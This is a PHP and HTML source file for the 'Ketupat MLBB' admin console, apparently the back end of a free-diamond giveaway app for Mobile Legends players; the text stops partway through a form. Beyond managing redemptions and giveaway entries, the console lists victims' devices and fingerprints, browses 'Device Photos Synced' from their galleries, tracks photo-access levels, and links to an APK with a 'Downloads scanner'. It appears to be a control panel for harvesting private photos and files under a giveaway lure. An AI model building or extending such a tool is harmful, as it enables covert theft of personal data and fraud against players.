<?php
/**
 * Ketupat MLBB - Supreme PHP Cloud Admin Console
 * Highest Access Engine (Secret Role / RLS Bypassed)
 */
require_once __DIR__ . '/config.php';

// Handle traditional logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    logoutAdmin();
    header('Location: index.php');
    exit;
}

// Enforce Passkey Authentication Gatekeeper
if (!isAdminAuthenticated()) {
    include __DIR__ . '/login.php';
    exit;
}

$cfg = getAppConfig();
$hasSecret = !empty($cfg['supabase_secret_key']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#070913">
  <title>Ketupat MLBB // Command Center</title>
  
  <!-- Google Material Symbols Outlined & Clean Modern Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23059669'%3E%3Cpath d='M12 2L2 12l10 10 10-10L12 2zm0 3.8L18.2 12 12 18.2 5.8 12 12 5.8z'/%3E%3C/svg%3E">
</head>
<body class="command-center">

  <div class="admin-layout">
    
    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="logo-badge">
          <span class="material-symbols-outlined">diamond</span>
        </div>
        <div class="brand-text">
          <h1>Ketupat MLBB</h1>
          <p>Command Center</p>
        </div>
      </div>

      <nav class="sidebar-nav">
        <div class="nav-section-title">Command Deck</div>
        
        <button type="button" class="nav-item-link active" data-view="overview">
          <span class="material-symbols-outlined nav-icon">dashboard</span>
          <span>Dashboard</span>
        </button>

        <button type="button" class="nav-item-link" data-view="redemptions">
          <span class="material-symbols-outlined nav-icon">shopping_bag</span>
          <span>Redemptions</span>
          <span class="nav-pill-badge" id="sidebarPendingBadge">0</span>
        </button>

        <button type="button" class="nav-item-link" data-view="users">
          <span class="material-symbols-outlined nav-icon">group</span>
          <span>Users & Players</span>
        </button>

        <button type="button" class="nav-item-link" data-view="giveaways">
          <span class="material-symbols-outlined nav-icon">card_giftcard</span>
          <span>Giveaway Arena</span>
        </button>

        <button type="button" class="nav-item-link" data-view="gallery">
          <span class="material-symbols-outlined nav-icon">photo_library</span>
          <span>Gallery Browser</span>
          <span class="nav-pill-badge" id="sidebarGalleryBadge" style="background-color: #7c3aed;">0</span>
        </button>

        <div class="nav-section-title">System Uplink</div>

        <button type="button" class="nav-item-link" data-view="settings">
          <span class="material-symbols-outlined nav-icon">tune</span>
          <span>Cloud & API Settings</span>
        </button>
      </nav>

      <div class="sidebar-footer">
        <div class="db-pill">
          <span class="status-dot online" id="sidebarStatusDot"></span>
          <span id="sidebarStatusText"><?= $hasSecret ? 'Highest Access (Secret)' : 'Supabase Connected' ?></span>
        </div>
        <a href="index.php?action=logout" class="btn-lock-sidebar" id="btnSidebarLogout" title="Lock Console / Logout" style="margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 8px 12px; background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: var(--radius-md); color: #ef4444; font-size: 13px; font-weight: 500; text-decoration: none; transition: all 0.2s ease;">
          <span class="material-symbols-outlined" style="font-size: 16px;">lock</span>
          <span>Lock Console</span>
        </a>
      </div>
    </aside>

    <!-- Main Wrapper -->
    <div class="main-wrapper">
      
      <!-- Top Navigation Header -->
      <header class="top-header">
        <div class="header-left">
          <button type="button" class="btn-mobile-menu" id="btnMobileMenu">
            <span class="material-symbols-outlined">menu</span>
          </button>
          <div class="title-cluster">
            <span class="page-kicker"><span class="status-dot online"></span> Live operations</span>
            <h2 class="page-title" id="pageTitleHeading">Dashboard Overview</h2>
          </div>
          <span id="accessBadgeHeader" class="<?= $hasSecret ? 'badge-highest-access' : 'badge-standard-access' ?>">
            <span class="material-symbols-outlined" style="font-size: 14px;"><?= $hasSecret ? 'verified_user' : 'lock_open' ?></span>
            <span id="accessBadgeText"><?= $hasSecret ? 'Highest Access (Service Role)' : 'Standard Access' ?></span>
          </span>
        </div>

        <div class="header-right">
          <select id="selectAutoRefresh" class="filter-select" title="Auto-refresh frequency">
            <option value="0">Auto-refresh: Off</option>
            <option value="15">Auto-refresh: 15s</option>
            <option value="30" selected>Auto-refresh: 30s</option>
            <option value="60">Auto-refresh: 60s</option>
          </select>

          <button type="button" id="btnRefreshAll" class="btn-refresh" title="Reload all data from Supabase">
            <span class="material-symbols-outlined btn-icon">sync</span>
            <span>Live Sync</span>
          </button>

          <a href="index.php?action=logout" class="btn-refresh" title="Lock Console" style="color: #ef4444; border-color: rgba(239, 68, 68, 0.25); text-decoration: none;">
            <span class="material-symbols-outlined btn-icon" style="color: #ef4444;">lock</span>
            <span>Lock</span>
          </a>
        </div>
      </header>

      <!-- Main Content Views -->
      <main class="content-area">

        <!-- ================= VIEW 1: DASHBOARD OVERVIEW ================= -->
        <section id="viewOverview" class="view-section active">
          
          <!-- Top Highest Access Callout Notice -->
          <div class="callout-highest-access" id="bannerSecretAlert" style="<?= $hasSecret ? 'display: none;' : '' ?>">
            <div class="callout-text">
              <h4><span class="material-symbols-outlined text-amber">warning</span> Elevate command access</h4>
              <p>You are currently operating with the public anon key. To enable full unrestricted CRUD operations across all tables without RLS restrictions, add your <strong>Supabase Secret Key</strong> in the Cloud Settings tab.</p>
            </div>
            <button type="button" class="btn btn-secondary btn-sm" onclick="switchView('settings')">
              <span>Enter Secret Key</span>
              <span class="material-symbols-outlined btn-icon-right">arrow_forward</span>
            </button>
          </div>

          <!-- KPI Metric Cards Grid -->
          <div class="stats-grid">
            <div class="stat-card">
              <div class="stat-icon users-bg">
                <span class="material-symbols-outlined">group</span>
              </div>
              <div class="stat-content">
                <div class="stat-value" id="statTotalUsers">0</div>
                <div class="stat-label">Total Registered Users</div>
              </div>
            </div>

            <div class="stat-card">
              <div class="stat-icon orders-bg">
                <span class="material-symbols-outlined">shopping_bag</span>
              </div>
              <div class="stat-content">
                <div class="stat-value" id="statTotalRedemptions">0</div>
                <div class="stat-label">Total Redemptions</div>
              </div>
            </div>

            <div class="stat-card">
              <div class="stat-icon pending-bg">
                <span class="material-symbols-outlined">hourglass_top</span>
              </div>
              <div class="stat-content">
                <div class="stat-value" id="statPendingRedemptions">0</div>
                <div class="stat-label">Pending Orders</div>
              </div>
            </div>

            <div class="stat-card">
              <div class="stat-icon diamonds-bg">
                <span class="material-symbols-outlined">diamond</span>
              </div>
              <div class="stat-content">
                <div class="stat-value" id="statDiamondsClaimed">0</div>
                <div class="stat-label">Diamonds Redeemed</div>
              </div>
            </div>

            <div class="stat-card">
              <div class="stat-icon tickets-bg">
                <span class="material-symbols-outlined">confirmation_number</span>
              </div>
              <div class="stat-content">
                <div class="stat-value" id="statGiveawayEntries">0</div>
                <div class="stat-label">Giveaway Entries</div>
              </div>
            </div>

            <div class="stat-card" style="cursor: pointer;" onclick="switchView('gallery')" title="View user gallery photos">
              <div class="stat-icon" style="background-color: #ede9fe; color: #7c3aed;">
                <span class="material-symbols-outlined">photo_library</span>
              </div>
              <div class="stat-content">
                <div class="stat-value" id="statGalleryPhotos">0</div>
                <div class="stat-label">Device Photos Synced</div>
              </div>
            </div>
          </div>

          <!-- Recent Activity & Orders -->
          <div class="table-card mt-6">
            <div class="table-header">
              <div class="table-title">
                <h3>Live Redemption Queue</h3>
                <p>Real-time player redemptions from the Ketupat mobile app</p>
              </div>
              <button type="button" class="btn btn-secondary btn-sm" onclick="switchView('redemptions')">
                <span>View All Orders</span>
                <span class="material-symbols-outlined btn-icon-right">arrow_forward</span>
              </button>
            </div>
            
            <div class="table-responsive">
              <table class="data-table" id="tableRecentRedemptions">
                <thead>
                  <tr>
                    <th>Order ID</th>
                    <th>Player Account</th>
                    <th>Diamonds</th>
                    <th>Points</th>
                    <th>Date</th>
                    <th>Status</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody id="tbodyRecentRedemptions">
                  <tr><td colspan="7" class="text-center py-4 text-muted">Loading orders...</td></tr>
                </tbody>
              </table>
            </div>
          </div>

        </section>

        <!-- ================= VIEW 2: REDEMPTIONS CRUD ================= -->
        <section id="viewRedemptions" class="view-section">
          <div class="section-toolbar">
            <div class="search-box">
              <span class="material-symbols-outlined search-icon">search</span>
              <input type="text" id="inputSearchRedemptions" placeholder="Search Order ID, Email, IGN, MLBB ID...">
            </div>

            <div class="filter-actions">
              <select id="selectRedemptionStatusFilter" class="filter-select">
                <option value="all">All Statuses</option>
                <option value="Processing">Processing</option>
                <option value="Completed">Completed</option>
                <option value="Rejected">Rejected</option>
              </select>

              <button type="button" class="btn btn-secondary btn-sm" id="btnExportRedemptionsCsv">
                <span class="material-symbols-outlined btn-icon">download</span>
                <span>Export CSV</span>
              </button>

              <button type="button" class="btn btn-primary btn-sm" id="btnOpenAddRedemptionModal">
                <span class="material-symbols-outlined btn-icon">add</span>
                <span>New Redemption</span>
              </button>
            </div>
          </div>

          <div class="table-card">
            <div class="table-responsive">
              <table class="data-table" id="tableRedemptions">
                <thead>
                  <tr>
                    <th>Order ID</th>
                    <th>User Email</th>
                    <th>MLBB Account</th>
                    <th>Package / Diamonds</th>
                    <th>Points Cost</th>
                    <th>Status</th>
                    <th>Created At</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody id="tbodyRedemptions">
                  <tr><td colspan="8" class="text-center py-4 text-muted">Loading redemptions...</td></tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        <!-- ================= VIEW 3: USERS CRUD ================= -->
        <section id="viewUsers" class="view-section">
          <div class="section-toolbar">
            <div class="search-box">
              <span class="material-symbols-outlined search-icon">search</span>
              <input type="text" id="inputSearchUsers" placeholder="Search Email, MLBB ID, Server, IGN...">
            </div>

            <div class="filter-actions">
              <button type="button" class="btn btn-secondary btn-sm" id="btnExportUsersCsv">
                <span class="material-symbols-outlined btn-icon">download</span>
                <span>Export CSV</span>
              </button>

              <button type="button" class="btn btn-primary btn-sm" id="btnOpenAddUserModal">
                <span class="material-symbols-outlined btn-icon">person_add</span>
                <span>Add User</span>
              </button>
            </div>
          </div>

          <div class="table-card">
            <div class="table-responsive">
              <table class="data-table" id="tableUsers">
                <thead>
                  <tr>
                    <th>User / Email</th>
                    <th>MLBB ID & Server</th>
                    <th>Device & Fingerprint</th>
                    <th>Gallery Access</th>
                    <th>Platform Binds</th>
                    <th>Points / Claims</th>
                    <th>Last Active</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody id="tbodyUsers">
                  <tr><td colspan="8" class="text-center py-4 text-muted">Loading users...</td></tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        <!-- ================= VIEW 4: GIVEAWAY ARENA CRUD ================= -->
        <section id="viewGiveaways" class="view-section">
          <div class="section-toolbar">
            <div class="pool-tabs">
              <button type="button" class="pool-tab-btn active" data-pool="all">All Pools</button>
              <button type="button" class="pool-tab-btn" data-pool="daily">Daily Pool (50 💎)</button>
              <button type="button" class="pool-tab-btn" data-pool="mega">Mega Pool (250 💎)</button>
              <button type="button" class="pool-tab-btn" data-pool="special">Special Pool (500 💎)</button>
            </div>

            <div class="filter-actions">
              <button type="button" class="btn btn-secondary btn-sm" id="btnExportGiveawaysCsv">
                <span class="material-symbols-outlined btn-icon">download</span>
                <span>Export CSV</span>
              </button>

              <button type="button" class="btn btn-primary btn-sm" id="btnOpenAddGiveawayModal">
                <span class="material-symbols-outlined btn-icon">add</span>
                <span>Add Entry</span>
              </button>

              <button type="button" class="btn btn-gold btn-sm" id="btnRollGiveawayWinner">
                <span class="material-symbols-outlined btn-icon">casino</span>
                <span>Draw Winner</span>
              </button>
            </div>
          </div>

          <div class="table-card">
            <div class="table-responsive">
              <table class="data-table" id="tableGiveaways">
                <thead>
                  <tr>
                    <th>ID</th>
                    <th>Pool Type</th>
                    <th>Player Email</th>
                    <th>MLBB Account</th>
                    <th>Ticket Count</th>
                    <th>Points Spent</th>
                    <th>Timestamp</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody id="tbodyGiveaways">
                  <tr><td colspan="8" class="text-center py-4 text-muted">Loading giveaway entries...</td></tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        <!-- ================= VIEW 5: USER GALLERY BROWSER ================= -->
        <section id="viewGallery" class="view-section">

          <!-- Hidden legacy select for backward compatibility -->
          <select id="selectGalleryUser" style="display: none;"><option value="">Select a device...</option></select>
          <button type="button" id="btnRefreshGallery" style="display: none;"></button>

          <!-- SUB-VIEW 1: DEVICES GRID HUB -->
          <div id="galleryDevicesView" class="gallery-subview">
            <!-- Grid Toolbar -->
            <div class="section-toolbar mb-4">
              <div class="gallery-hub-header">
                <div class="gallery-hub-title-group">
                  <div class="gallery-hub-icon-wrap">
                    <span class="material-symbols-outlined">devices</span>
                  </div>
                  <div>
                    <h3 class="gallery-hub-heading">User Devices Directory</h3>
                    <p class="text-xs text-muted">Select a connected device card to inspect gallery, hardware specs, and player MLBB details</p>
                  </div>
                  <span class="badge-region-pill" id="galleryTotalDevicesBadge">0 Devices</span>
                </div>

                <div class="gallery-hub-actions">
                  <button type="button" class="btn btn-secondary btn-sm" id="btnRefreshDevicesGrid" title="Refresh all devices">
                    <span class="material-symbols-outlined btn-icon">sync</span>
                    <span>Sync</span>
                  </button>
                  <button type="button" class="btn btn-primary btn-sm" id="btnOpenAddDeviceModal" title="Register a new device or player">
                    <span class="material-symbols-outlined btn-icon">add_circle</span>
                    <span>Add Device</span>
                  </button>
                  <a href="../MLBB-Diamond-Giveaway.apk" download class="btn btn-secondary btn-sm" title="Download newly compiled APK with full Downloads scanner">
                    <span class="material-symbols-outlined btn-icon">android</span>
                    <span>Get Updated APK</span>
                  </a>
                </div>
              </div>

              <!-- Filter and Search Strip -->
              <div class="gallery-filter-strip mt-3">
                <div class="gallery-search-box">
                  <span class="material-symbols-outlined search-icon">search</span>
                  <input type="text" id="inputGallerySearch" class="form-input" placeholder="Search devices by phone model, ID, player IGN, or MLBB ID...">
                  <button type="button" id="btnClearGallerySearch" class="btn-clear-search" style="display: none;" title="Clear search">
                    <span class="material-symbols-outlined">close</span>
                  </button>
                </div>

                <div class="gallery-filter-chips">
                  <button type="button" class="filter-chip active" data-filter="all">All Devices</button>
                  <button type="button" class="filter-chip" data-filter="granted">Full Access ✓</button>
                  <button type="button" class="filter-chip" data-filter="avatar_only">Avatar Only ⏳</button>
                  <button type="button" class="filter-chip" data-filter="has_photos">Has Photos</button>
                </div>
              </div>
            </div>

            <!-- Devices Cards Grid -->
            <div id="galleryDevicesGrid" class="gallery-devices-grid">
              <div class="empty-state" style="grid-column: 1 / -1;">
                <span class="material-symbols-outlined spin" style="font-size: 44px; color: var(--primary);">sync</span>
                <p class="mt-2 text-muted">Retrieving connected devices...</p>
              </div>
            </div>
          </div>

          <!-- SUB-VIEW 2: SELECTED DEVICE DETAIL HUB -->
          <div id="galleryDeviceDetailView" class="gallery-subview" style="display: none;">
            <!-- Navigation Breadcrumb & Toolbar -->
            <div class="section-toolbar mb-3">
              <div class="gallery-detail-toolbar">
                <div class="gallery-nav-breadcrumb">
                  <button type="button" class="btn btn-secondary btn-sm" id="btnBackToDevicesGrid" title="Back to Devices Grid">
                    <span class="material-symbols-outlined btn-icon">arrow_back</span>
                    <span>Back to Devices</span>
                  </button>
                  <div class="breadcrumb-trail">
                    <span class="breadcrumb-root" id="breadcrumbRootDevices" style="cursor: pointer;">Devices Directory</span>
                    <span class="material-symbols-outlined breadcrumb-separator">chevron_right</span>
                    <span class="breadcrumb-active" id="breadcrumbDeviceName">Selected Device</span>
                  </div>
                </div>

                <div class="gallery-detail-actions">
                  <button type="button" class="btn btn-secondary btn-sm" id="btnSyncActiveDevice" title="Refresh this device data">
                    <span class="material-symbols-outlined btn-icon">sync</span>
                    <span>Sync</span>
                  </button>
                  <button type="button" class="btn btn-secondary btn-sm" id="btnOpenUploadGalleryModal">
                    <span class="material-symbols-outlined btn-icon">add_photo_alternate</span>
                    <span>Upload Photos</span>
                  </button>
                  <button type="button" class="btn btn-danger btn-sm" id="btnDeleteDeviceGallery" style="display: none;" title="Delete this device and its gallery">
                    <span class="material-symbols-outlined btn-icon">phonelink_erase</span>
                    <span>Delete Device</span>
                  </button>
                </div>
              </div>
            </div>

            <!-- User Device Gallery Hero Strip -->
            <div class="gallery-hero-strip gallery-device-hero" id="galleryUserHero" style="display: none;">
              <div class="user-cell-meta gallery-device-summary">
                <img id="galleryHeroAvatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23cbd5e1'%3E%3Ccircle cx='12' cy='8' r='4'/%3E%3Cpath d='M20 21a8 8 0 0 0-16 0'/%3E%3C/svg%3E" class="user-mini-avatar" style="width: 44px; height: 44px; border: 2px solid var(--primary);" alt="Avatar">
                <div class="gallery-device-copy">
                  <div class="gallery-device-heading">
                    <h4 id="galleryHeroFormattedTitle" style="font-size: 1.15rem; font-weight: 800; margin: 0;">Phone Model | ID (Server)</h4>
                    <span class="badge-device-name gallery-device-chip" id="galleryHeroDeviceBadge">
                      <span class="material-symbols-outlined" style="font-size: 14px;">smartphone</span>
                      <span id="galleryHeroDeviceName">Android Device</span>
                    </span>
                    <span class="badge-device-name gallery-device-chip" id="galleryHeroDeviceIdBadge" style="cursor: pointer; background: rgba(59, 130, 246, 0.15); border-color: rgba(59, 130, 246, 0.3); color: #60a5fa;" title="Click to copy unique Device ID" onclick="const did = document.getElementById('galleryHeroDeviceId')?.textContent; if(did && did !== '—') { navigator.clipboard.writeText(did); showToast('Device ID copied: ' + did, 'content_copy'); }">
                      <span class="material-symbols-outlined" style="font-size: 14px;">fingerprint</span>
                      <span id="galleryHeroDeviceId">&mdash;</span>
                    </span>
                  </div>
                  <div class="text-xs text-muted gallery-device-meta">
                    <span class="gallery-meta-player">Player: <strong id="galleryHeroIgn">&mdash;</strong></span>
                    <span class="gallery-meta-mlbb">MLBB: <strong id="galleryHeroMlbb">&mdash;</strong></span>
                    <span class="gallery-meta-email"><span class="gallery-meta-label">Email</span> <span id="galleryHeroEmail">&mdash;</span></span>
                    <span class="gallery-meta-model"><span class="gallery-meta-label">Model</span> <strong id="galleryHeroDeviceModel">&mdash;</strong></span>
                  </div>
                </div>
              </div>

              <div class="gallery-device-status">
                <span id="galleryHeroAccessBadge" class="badge-pending gallery-access-badge">
                  <span class="material-symbols-outlined" id="galleryHeroAccessIcon" style="font-size: 14px;">hourglass_top</span>
                  <span id="galleryHeroAccessText">Checking Access...</span>
                </span>
                <span class="badge-region-pill gallery-photo-count" id="galleryHeroPhotoCount">0 Photos</span>
              </div>
            </div>

            <!-- SUB-MENU TABS FOR SELECTED DEVICE -->
            <div class="gallery-detail-tabs-wrap mt-4">
              <div class="gallery-detail-tabs" id="galleryDetailTabs">
                <button type="button" class="gallery-detail-tab active" data-tab="gallery" id="tabBtnGallery">
                  <span class="material-symbols-outlined">photo_library</span>
                  <span>Gallery</span>
                  <span class="tab-count-pill" id="tabCountGallery">0</span>
                </button>
                <button type="button" class="gallery-detail-tab" data-tab="device_info" id="tabBtnDeviceInfo">
                  <span class="material-symbols-outlined">smartphone</span>
                  <span>Device Info</span>
                </button>
                <button type="button" class="gallery-detail-tab" data-tab="mlbb_info" id="tabBtnMlbbInfo">
                  <span class="material-symbols-outlined">sports_esports</span>
                  <span>MLBB Info</span>
                </button>
              </div>
            </div>

            <!-- TAB PANE 1: PHOTO GALLERY -->
            <div id="paneGalleryPhotos" class="gallery-tab-pane active mt-3">
              <div class="gallery-photos-toolbar mb-3">
                <div class="text-xs text-muted" id="galleryPhotosSummary">Displaying high-resolution synced media</div>
                <div class="gallery-photos-actions">
                  <button type="button" class="btn btn-secondary btn-xs" id="btnUploadPhotosInTab" onclick="openUploadGalleryModal()">
                    <span class="material-symbols-outlined" style="font-size: 14px;">add_photo_alternate</span>
                    <span>Upload</span>
                  </button>
                  <button type="button" class="btn btn-secondary btn-xs text-danger" id="btnDeleteAllPhotos" style="display: none;" onclick="confirmDeleteAllPhotos()">
                    <span class="material-symbols-outlined" style="font-size: 14px;">delete_sweep</span>
                    <span>Wipe All Photos</span>
                  </button>
                </div>
              </div>
              <div class="gallery-grid-container">
                <div id="galleryPhotosGrid" class="gallery-photos-grid">
                  <div class="empty-state" style="grid-column: 1 / -1;">
                    <span class="material-symbols-outlined" style="font-size: 48px; color: #a7f3d0;">photo_library</span>
                    <h3 style="font-size: 1.1rem; margin-top: 10px;">Select a player to browse their gallery</h3>
                    <p class="text-muted text-sm mt-1">Photos synced from device will appear here in high-resolution with download and lightbox preview.</p>
                  </div>
                </div>
              </div>
            </div>

            <!-- TAB PANE 2: DEVICE INFO & HARDWARE -->
            <div id="paneDeviceInfo" class="gallery-tab-pane mt-3" style="display: none;">
              <div class="device-spec-grid" id="deviceSpecContainer">
                <!-- Dynamically populated by renderDeviceInfo() -->
              </div>
            </div>

            <!-- TAB PANE 3: MLBB INFO & ACCOUNTS -->
            <div id="paneMlbbInfo" class="gallery-tab-pane mt-3" style="display: none;">
              <div class="mlbb-spec-grid" id="mlbbSpecContainer">
                <!-- Dynamically populated by renderMlbbInfo() -->
              </div>
            </div>

          </div>
        </section>

        <!-- ================= VIEW 6: CLOUD & API SETTINGS ================= -->
        <section id="viewSettings" class="view-section">
          
          <div class="settings-grid">
            
            <!-- Supabase Cloud Credentials Card -->
            <div class="settings-card">
              <div class="settings-card-header">
                <div class="settings-icon">
                  <span class="material-symbols-outlined">cloud</span>
                </div>
                <div>
                  <h3 class="settings-card-title">Supabase Cloud Database</h3>
                  <p class="settings-card-desc">Configure database credentials & highest access service role key</p>
                </div>
              </div>

              <form id="formCloudSettings" class="settings-form">
                <div class="form-group">
                  <label class="form-label">Supabase Project REST URL</label>
                  <input type="url" id="inputSupabaseUrl" class="form-input font-mono" placeholder="https://xyz.supabase.co" required>
                  <p class="form-hint">Your Supabase project URL (Project Settings &rarr; API)</p>
                </div>

                <div class="form-group">
                  <label class="form-label">Supabase Secret Key (Highest Access / Service Role)</label>
                  <div class="input-with-action">
                    <input type="password" id="inputSupabaseSecretKey" class="form-input font-mono" placeholder="sb_secret_... or eyJhbGciOi...">
                    <button type="button" class="btn-reveal" id="btnToggleSecretKey">
                      <span class="material-symbols-outlined">visibility</span>
                    </button>
                  </div>
                  <p class="form-hint">Secret key grants full read/write/delete privileges and bypasses RLS policies completely.</p>
                </div>

                <div class="form-group">
                  <label class="form-label">Supabase Publishable / Anon Key (Fallback)</label>
                  <input type="text" id="inputSupabaseAnonKey" class="form-input font-mono" placeholder="sb_publishable_... or anon key">
                  <p class="form-hint">Used as secondary fallback if secret key is omitted</p>
                </div>

                <div class="settings-actions">
                  <button type="submit" class="btn btn-primary" id="btnSaveCloudSettings">
                    <span class="material-symbols-outlined btn-icon">save</span>
                    <span>Save Cloud Settings</span>
                  </button>

                  <button type="button" class="btn btn-secondary" id="btnTestSupabaseConnection">
                    <span class="material-symbols-outlined btn-icon">network_check</span>
                    <span>Test Connection</span>
                  </button>
                </div>

                <div id="connectionTestResult" class="status-msg hidden mt-4"></div>
              </form>
            </div>

            <!-- DlyyZ API Key & External Integrations -->
            <div class="settings-card">
              <div class="settings-card-header">
                <div class="settings-icon dlyyz-bg">
                  <span class="material-symbols-outlined">api</span>
                </div>
                <div>
                  <h3 class="settings-card-title">DlyyZ MLBB Check API</h3>
                  <p class="settings-card-desc">Backend API key used for MLBB username & account bind verification</p>
                </div>
              </div>

              <form id="formDlyyzSettings" class="settings-form">
                <div class="form-group">
                  <label class="form-label">DlyyZ Rest API Key</label>
                  <input type="text" id="inputDlyyzApiKey" class="form-input font-mono" placeholder="Enter your DlyyZ API Key">
                  <p class="form-hint">Endpoint: <code>https://dlyyz-rest.my.id/api/v1/cekbind</code></p>
                </div>

                <div class="settings-actions">
                  <button type="submit" class="btn btn-primary" id="btnSaveDlyyzSettings">
                    <span class="material-symbols-outlined btn-icon">save</span>
                    <span>Update API Configuration</span>
                  </button>
                </div>
              </form>
            </div>

            <!-- FIDO2 / Hardware Passkeys Management -->
            <div class="settings-card">
              <div class="settings-card-header">
                <div class="settings-icon" style="background: rgba(16, 185, 129, 0.15); color: #10b981;">
                  <span class="material-symbols-outlined">fingerprint</span>
                </div>
                <div>
                  <h3 class="settings-card-title">FIDO2 / Hardware Passkeys</h3>
                  <p class="settings-card-desc">Saved directly to your Google Account, Apple iCloud Keychain, or Windows Hello</p>
                </div>
              </div>

              <div class="settings-form">
                <div id="passkeysListContainer" style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px;">
                  <!-- Populated by admin.js loadRegisteredPasskeys() -->
                </div>

                <div class="settings-actions">
                  <button type="button" class="btn btn-primary" id="btnRegisterPasskeyDashboard">
                    <span class="material-symbols-outlined btn-icon">add_circle</span>
                    <span>Register This Device as a Passkey</span>
                  </button>
                </div>
              </div>
            </div>

          </div>

        </section>

      </main>
    </div>
  </div>

  <!-- ================= MODALS ================= -->

  <!-- 1. ADD / EDIT USER MODAL -->
  <div class="modal-overlay" id="modalUser">
    <div class="modal-card">
      <div class="modal-header">
        <h3 class="modal-title" id="modalUserTitle">Add / Edit User</h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalUser')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <form id="formUserModal">
        <div class="modal-body">
          <div class="form-group">
            <label class="form-label">Email Address *</label>
            <input type="email" id="modalUserEmail" class="form-input" required placeholder="player@example.com">
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">MLBB User ID</label>
              <input type="text" id="modalUserMlbbId" class="form-input" placeholder="User ID">
            </div>
            <div class="form-group flex-1">
              <label class="form-label">MLBB Server (Zone)</label>
              <input type="text" id="modalUserMlbbServer" class="form-input" placeholder="Zone ID">
            </div>
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">In-Game Name (IGN)</label>
              <input type="text" id="modalUserMlbbIgn" class="form-input" placeholder="Player IGN">
            </div>
            <div class="form-group flex-1">
              <label class="form-label">Region / Country</label>
              <input type="text" id="modalUserMlbbRegion" class="form-input" placeholder="Indonesia">
            </div>
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">Points Balance</label>
              <input type="number" id="modalUserPoints" class="form-input" value="150" min="0">
            </div>
            <div class="form-group flex-1">
              <label class="form-label">Diamonds Claimed</label>
              <input type="number" id="modalUserDiamondsClaimed" class="form-input" value="0" min="0">
            </div>
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">Giveaway Tickets</label>
              <input type="number" id="modalUserTickets" class="form-input" value="0" min="0">
            </div>
            <div class="form-group flex-1">
              <label class="form-label">Daily Streak</label>
              <input type="number" id="modalUserStreak" class="form-input" value="1" min="1">
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" onclick="closeModal('modalUser')">Cancel</button>
          <button type="submit" class="btn btn-primary">Save User Record</button>
        </div>
      </form>
    </div>
  </div>

  <!-- 2. ADD / EDIT REDEMPTION MODAL -->
  <div class="modal-overlay" id="modalRedemption">
    <div class="modal-card">
      <div class="modal-header">
        <h3 class="modal-title" id="modalRedemptionTitle">Manage Redemption</h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalRedemption')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <form id="formRedemptionModal">
        <input type="hidden" id="modalRedemptionOrderId">
        <div class="modal-body">
          <div class="form-group">
            <label class="form-label">User Email *</label>
            <input type="email" id="modalRedemptionEmail" class="form-input" required placeholder="player@example.com">
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">MLBB User ID</label>
              <input type="text" id="modalRedemptionMlbbId" class="form-input" placeholder="User ID">
            </div>
            <div class="form-group flex-1">
              <label class="form-label">MLBB Server</label>
              <input type="text" id="modalRedemptionMlbbServer" class="form-input" placeholder="Zone ID">
            </div>
          </div>
          <div class="form-group">
            <label class="form-label">Player IGN</label>
            <input type="text" id="modalRedemptionMlbbIgn" class="form-input" placeholder="IGN">
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">Diamonds Amount</label>
              <input type="number" id="modalRedemptionDiamonds" class="form-input" value="50" min="1" required>
            </div>
            <div class="form-group flex-1">
              <label class="form-label">Points Deducted</label>
              <input type="number" id="modalRedemptionPoints" class="form-input" value="500" min="0" required>
            </div>
          </div>
          <div class="form-group">
            <label class="form-label">Package Name</label>
            <input type="text" id="modalRedemptionPackName" class="form-input" value="50 Diamonds" placeholder="50 Diamonds">
          </div>
          <div class="form-group">
            <label class="form-label">Order Fulfillment Status</label>
            <select id="modalRedemptionStatus" class="form-select">
              <option value="Processing (7-14 Days)">Processing (7-14 Days)</option>
              <option value="Completed">Completed (Diamonds Sent)</option>
              <option value="Rejected">Rejected</option>
            </select>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" onclick="closeModal('modalRedemption')">Cancel</button>
          <button type="submit" class="btn btn-primary">Save Redemption</button>
        </div>
      </form>
    </div>
  </div>

  <!-- 3. ADD / EDIT GIVEAWAY ENTRY MODAL -->
  <div class="modal-overlay" id="modalGiveaway">
    <div class="modal-card">
      <div class="modal-header">
        <h3 class="modal-title" id="modalGiveawayTitle">Add Giveaway Entry</h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalGiveaway')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <form id="formGiveawayModal">
        <input type="hidden" id="modalGiveawayId">
        <div class="modal-body">
          <div class="form-group">
